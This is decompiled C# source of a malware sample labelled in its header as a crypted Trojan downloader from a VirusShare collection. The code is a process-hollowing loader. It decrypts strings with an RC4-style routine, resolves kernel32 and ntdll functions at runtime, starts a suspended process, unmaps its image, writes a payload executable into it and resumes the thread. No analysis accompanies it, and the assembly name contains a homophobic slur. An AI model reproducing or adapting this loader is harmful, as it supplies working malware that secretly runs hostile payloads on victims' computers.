// Decompiled with JetBrains decompiler
// Type: rp
// Assembly: If you accept this then you are really a faggot like seriously lol jk i love you and yes you can rename this long ass file name lol, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9FF29E54-20E1-4588-8681-38890A7A949F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Downloader.MSIL.Crypted.z-1b34a57da3d1e4c766696e1b4d3dc33eb69cf2d6cf4b0c051b173851e23e542d.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
public sealed class rp
{
  public const long PAGE_NOCACHE = 512;
  public const long PAGE_EXECUTE_READWRITE = 64;
  public const long PAGE_EXECUTE_WRITECOPY = 128;
  public const long PAGE_EXECUTE_READ = 32;
  public const long PAGE_EXECUTE = 16;
  public const long PAGE_WRITECOPY = 8;
  public const long PAGE_NOACCESS = 1;
  public const long PAGE_READWRITE = 4;
  public const uint PAGE_READONLY = 2;

  public static string eqwrsdafasdf(
    string asdfsadjfwerjasiodufiouweioru8937497829137489jklasdjf,
    string asiodufosdafioweurioioasdkljfklasdjflk)
  {
    int index1 = 0;
    int index2 = 0;
    StringBuilder stringBuilder = new StringBuilder();
    string empty = string.Empty;
    int[] numArray1 = new int[257];
    int[] numArray2 = new int[257];
    int length = asiodufosdafioweurioioasdkljfklasdjflk.Length;
    int location1 = 0;
    while (location1 <= (int) byte.MaxValue)
    {
      char String = asiodufosdafioweurioioasdkljfklasdjflk.Substring(location1 % length, 1).ToCharArray()[0];
      numArray2[location1] = Strings.Asc(String);
      numArray1[location1] = location1;
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
    }
    int index3 = 0;
    int location2 = 0;
    while (location2 <= (int) byte.MaxValue)
    {
      index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
      int num = numArray1[location2];
      numArray1[location2] = numArray1[index3];
      numArray1[index3] = num;
      Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
    }
    location1 = 1;
    while (location1 <= asdfsadjfwerjasiodufiouweioru8937497829137489jklasdjf.Length)
    {
      index1 = checked (index1 + 1) % 256;
      index2 = checked (index2 + numArray1[index1]) % 256;
      int num1 = numArray1[index1];
      numArray1[index1] = numArray1[index2];
      numArray1[index2] = num1;
      int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
      int CharCode = Strings.Asc(asdfsadjfwerjasiodufiouweioru8937497829137489jklasdjf.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
      stringBuilder.Append(Strings.Chr(CharCode));
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
    }
    string str = stringBuilder.ToString();
    stringBuilder.Length = 0;
    return str;
  }

  public static void inject(byte[] data)
  {
    if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
      rp.strangething(data, Conversions.ToString(Environment.SystemDirectory[0]) + ":\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
    else
      rp.strangething(data, Application.ExecutablePath);
  }

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  public static T CreateAPI<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(rp.GetProcAddress(rp.LoadLibraryA(ref name), ref method), typeof (T));

  public static void strangething(byte[] data, string target)
  {
    rp.CreateProcessA api1 = rp.CreateAPI<rp.CreateProcessA>("kernel32", "CreateProcessA");
    rp.WriteProcessMemory api2 = rp.CreateAPI<rp.WriteProcessMemory>("kernel32", "WriteProcessMemory");
    rp.ReadProcessMemory api3 = rp.CreateAPI<rp.ReadProcessMemory>("kernel32", "ReadProcessMemory");
    rp.VirtualAllocEx api4 = rp.CreateAPI<rp.VirtualAllocEx>("kernel32", "VirtualAllocEx");
    rp.ZwUnmapViewOfSection api5 = rp.CreateAPI<rp.ZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
    rp.ResumeThread api6 = rp.CreateAPI<rp.ResumeThread>("kernel32", "ResumeThread");
    rp.GetThreadContext api7 = rp.CreateAPI<rp.GetThreadContext>("kernel32", "GetThreadContext");
    rp.SetThreadContext api8 = rp.CreateAPI<rp.SetThreadContext>("kernel32", "SetThreadContext");
    rp.H.Context context = new rp.H.Context();
    rp.H.Process_Information info = new rp.H.Process_Information();
    rp.H.Startup_Information startup = new rp.H.Startup_Information();
    rp.H.Security_Flags process1 = new rp.H.Security_Flags();
    rp.H.Security_Flags thread = new rp.H.Security_Flags();
    object Instance1 = (object) GCHandle.Alloc((object) data, GCHandleType.Pinned);
    int integer = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(Instance1, (System.Type) null, "AddrOfPinnedObject", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "ToInt32", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    rp.H.DOS_Header dosHeader1 = new rp.H.DOS_Header();
    System.Type Type = typeof (Marshal);
    object[] objArray1 = new object[2];
    object[] objArray2 = objArray1;
    object Instance2 = Instance1;
    object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (System.Type) null, "AddrOfPinnedObject", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    objArray2[0] = objectValue;
    objArray1[1] = (object) dosHeader1.GetType();
    object[] objArray3 = objArray1;
    object[] Arguments = objArray3;
    bool[] flagArray = new bool[2]{ true, false };
    bool[] CopyBack = flagArray;
    object obj = NewLateBinding.LateGet((object) null, Type, "PtrToStructure", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
    if (flagArray[0])
      NewLateBinding.LateSetComplex(Instance2, (System.Type) null, "AddrOfPinnedObject", new object[1]
      {
        RuntimeHelpers.GetObjectValue(objArray3[0])
      }, (string[]) null, (System.Type[]) null, true, false);
    rp.H.DOS_Header dosHeader2;
    rp.H.DOS_Header dosHeader3 = obj != null ? (rp.H.DOS_Header) obj : dosHeader2;
    NewLateBinding.LateCall(Instance1, (System.Type) null, "Free", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    IntPtr system;
    if (-(api1((string) null, target, ref process1, ref thread, false, 4U, system, (string) null, ref startup, out info) ? 1 : 0) == 0)
      return;
    rp.H.NT_Headers ntHeaders1 = new rp.H.NT_Headers();
    object structure1 = Marshal.PtrToStructure(new IntPtr(checked (integer + dosHeader3.Address)), ntHeaders1.GetType());
    rp.H.NT_Headers ntHeaders2;
    rp.H.NT_Headers ntHeaders3 = structure1 != null ? (rp.H.NT_Headers) structure1 : ntHeaders2;
    startup.CB = Strings.Len((object) startup);
    context.Flags = 65539U;
    if (ntHeaders3.Signature != 17744U | dosHeader3.Magic != (ushort) 23117)
      return;
    int num1 = api7(info.Thread, ref context) ? 1 : 0;
    rp.ReadProcessMemory readProcessMemory = api3;
    IntPtr process2 = info.Process;
    IntPtr address1 = (IntPtr) checked ((long) context.Ebx + 8L);
    long num2;
    IntPtr ptr = (IntPtr) num2;
    ref IntPtr local1 = ref ptr;
    IntPtr size1 = (IntPtr) 4;
    int num3 = 0;
    ref int local2 = ref num3;
    int num4 = readProcessMemory(process2, address1, ref local1, size1, ref local2);
    long address2 = (long) ptr;
    long num5 = api5(info.Process, (IntPtr) address2);
    uint num6 = checked ((uint) (int) api4(info.Process, (IntPtr) (long) ntHeaders3.Optional.Image, ntHeaders3.Optional.SImage, 12288U, 4U));
    if (num6 == 0U)
      return;
    rp.WriteProcessMemory writeProcessMemory1 = api2;
    IntPtr process3 = info.Process;
    IntPtr address3 = (IntPtr) (long) num6;
    byte[] buffer1 = data;
    IntPtr sheaders = (IntPtr) (long) ntHeaders3.Optional.SHeaders;
    uint num7;
    int num8 = checked ((int) num7);
    ref int local3 = ref num8;
    int num9 = writeProcessMemory1(process3, address3, buffer1, sheaders, out local3) ? 1 : 0;
    uint num10 = checked ((uint) num8);
    long num11 = (long) checked (dosHeader3.Address + 248);
    int num12 = checked ((int) ntHeaders3.File.Sections - 1);
    int num13 = 0;
    while (num13 <= num12)
    {
      ptr = new IntPtr(checked ((long) integer + num11 + (long) (num13 * 40)));
      rp.H.Section_Header sectionHeader1;
      object structure2 = Marshal.PtrToStructure(ptr, sectionHeader1.GetType());
      rp.H.Section_Header sectionHeader2;
      sectionHeader1 = structure2 != null ? (rp.H.Section_Header) structure2 : sectionHeader2;
      byte[] numArray = new byte[checked ((int) sectionHeader1.Size + 1)];
      int num14 = checked ((int) ((long) sectionHeader1.Size - 1L));
      int index = 0;
      while (index <= num14)
      {
        numArray[index] = data[checked ((int) ((long) sectionHeader1.Pointer + (long) index))];
        checked { ++index; }
      }
      rp.WriteProcessMemory writeProcessMemory2 = api2;
      IntPtr process4 = info.Process;
      IntPtr address4 = (IntPtr) (long) checked (num6 + sectionHeader1.Address);
      byte[] buffer2 = numArray;
      IntPtr size2 = (IntPtr) (long) sectionHeader1.Size;
      num8 = checked ((int) num10);
      ref int local4 = ref num8;
      int num15 = writeProcessMemory2(process4, address4, buffer2, size2, out local4) ? 1 : 0;
      num10 = checked ((uint) num8);
      checked { ++num13; }
    }
    object bytes = (object) BitConverter.GetBytes(num6);
    rp.WriteProcessMemory writeProcessMemory3 = api2;
    IntPtr process5 = info.Process;
    IntPtr address5 = (IntPtr) checked ((long) context.Ebx + 8L);
    byte[] buffer3 = (byte[]) bytes;
    IntPtr size3 = (IntPtr) 4;
    num8 = checked ((int) num10);
    ref int local5 = ref num8;
    int num16 = writeProcessMemory3(process5, address5, buffer3, size3, out local5) ? 1 : 0;
    num7 = checked ((uint) num8);
    context.Eax = checked (num6 + ntHeaders3.Optional.Address);
    int num17 = api8(info.Thread, ref context) ? 1 : 0;
    int num18 = (int) api6(info.Thread);
  }

  private static long RShift(long lValue, long lNumberOfBitsToShift) => checked ((long) Math.Round(unchecked (rp.vbLongToULong(lValue) / Math.Pow(2.0, (double) lNumberOfBitsToShift))));

  private static double vbLongToULong(long Value) => Value >= 0L ? (double) Value : (double) Value + 4294967296.0;

  private static long Protect(long characteristics) => Conversions.ToLong(new object[8]
  {
    (object) 1L,
    (object) 16L,
    (object) 2U,
    (object) 32L,
    (object) 4L,
    (object) 64L,
    (object) 4L,
    (object) 64L
  }[checked ((int) rp.RShift(characteristics, 29L))]);

  public delegate bool CreateProcessA(
    string name,
    string command,
    ref rp.H.Security_Flags process,
    ref rp.H.Security_Flags thread,
    bool inherit,
    uint flags,
    IntPtr system,
    string current,
    [In] ref rp.H.Startup_Information startup,
    out rp.H.Process_Information info);

  public delegate bool WriteProcessMemory(
    IntPtr process,
    IntPtr address,
    byte[] buffer,
    IntPtr size,
    out int written);

  public delegate int ReadProcessMemory(
    IntPtr process,
    IntPtr address,
    ref IntPtr buffer,
    IntPtr size,
    ref int read);

  public delegate IntPtr VirtualAllocEx(
    IntPtr process,
    IntPtr address,
    uint size,
    uint type,
    uint protect);

  public delegate long ZwUnmapViewOfSection(IntPtr process, IntPtr address);

  public delegate uint ResumeThread(IntPtr thread);

  public delegate bool GetThreadContext(IntPtr thread, ref rp.H.Context context);

  public delegate bool SetThreadContext(IntPtr thread, ref rp.H.Context context);

  [EditorBrowsable(EditorBrowsableState.Never)]
  public class H
  {
    public struct Context
    {
      public uint Flags;
      public uint D0;
      public uint D1;
      public uint D2;
      public uint D3;
      public uint D6;
      public uint D7;
      public rp.H.Save Save;
      public uint SG;
      public uint SF;
      public uint SE;
      public uint SD;
      public uint Edi;
      public uint Esi;
      public uint Ebx;
      public uint Edx;
      public uint Ecx;
      public uint Eax;
      public uint Ebp;
      public uint Eip;
      public uint SC;
      public uint EFlags;
      public uint Esp;
      public uint SS;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] Registers;
    }

    public struct Save
    {
      public uint Control;
      public uint Status;
      public uint Tag;
      public uint ErrorO;
      public uint ErrorS;
      public uint DataO;
      public uint DataS;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] RegisterArea;
      public uint State;
    }

    public struct Misc
    {
      public uint Address;
      public uint Size;
    }

    public struct Section_Header
    {
      public byte Name;
      public rp.H.Misc Misc;
      public uint Address;
      public uint Size;
      public uint Pointer;
      public uint PRelocations;
      public uint PLines;
      public uint NRelocations;
      public uint NLines;
      public uint Flags;
    }

    public struct Process_Information
    {
      public IntPtr Process;
      public IntPtr Thread;
      public int ProcessId;
      public int ThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct Startup_Information
    {
      public int CB;
      public string ReservedA;
      public string Desktop;
      public string Title;
      public int X;
      public int Y;
      public int XSize;
      public int YSize;
      public int XCount;
      public int YCount;
      public int Fill;
      public int Flags;
      public short ShowWindow;
      public short ReservedB;
      public int ReservedC;
      public int Input;
      public int Output;
      public int Error;
    }

    public struct Security_Flags
    {
      public int Length;
      public IntPtr Descriptor;
      public int Inherit;
    }

    public struct DOS_Header
    {
      public ushort Magic;
      public ushort Last;
      public ushort Pages;
      public ushort Relocations;
      public ushort Size;
      public ushort Minimum;
      public ushort Maximum;
      public ushort SS;
      public ushort SP;
      public ushort Checksum;
      public ushort IP;
      public ushort CS;
      public ushort Table;
      public ushort Overlay;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] ReservedA;
      public ushort ID;
      public ushort Info;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] ReservedB;
      public int Address;
    }

    public struct NT_Headers
    {
      public uint Signature;
      public rp.H.File_Header File;
      public rp.H.Optional_Headers Optional;
    }

    public struct File_Header
    {
      public ushort Machine;
      public ushort Sections;
      public uint Stamp;
      public uint Table;
      public uint Symbols;
      public ushort Size;
      public ushort Flags;
    }

    public struct Optional_Headers
    {
      public ushort Magic;
      public byte Major;
      public byte Minor;
      public uint SCode;
      public uint IData;
      public uint UData;
      public uint Address;
      public uint Code;
      public uint Data;
      public uint Image;
      public uint SectionA;
      public uint FileA;
      public ushort MajorO;
      public ushort MinorO;
      public ushort MajorI;
      public ushort MinorI;
      public ushort MajorS;
      public ushort MinorS;
      public uint Version;
      public uint SImage;
      public uint SHeaders;
      public uint Checksum;
      public ushort Subsystem;
      public ushort Flags;
      public uint SSReserve;
      public uint SSCommit;
      public uint SHReserve;
      public uint SHCommit;
      public uint LFlags;
      public uint Count;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public rp.H.Data_Directory[] DataDirectory;
    }

    public struct Data_Directory
    {
      public uint Address;
      public uint Size;
    }
  }
}
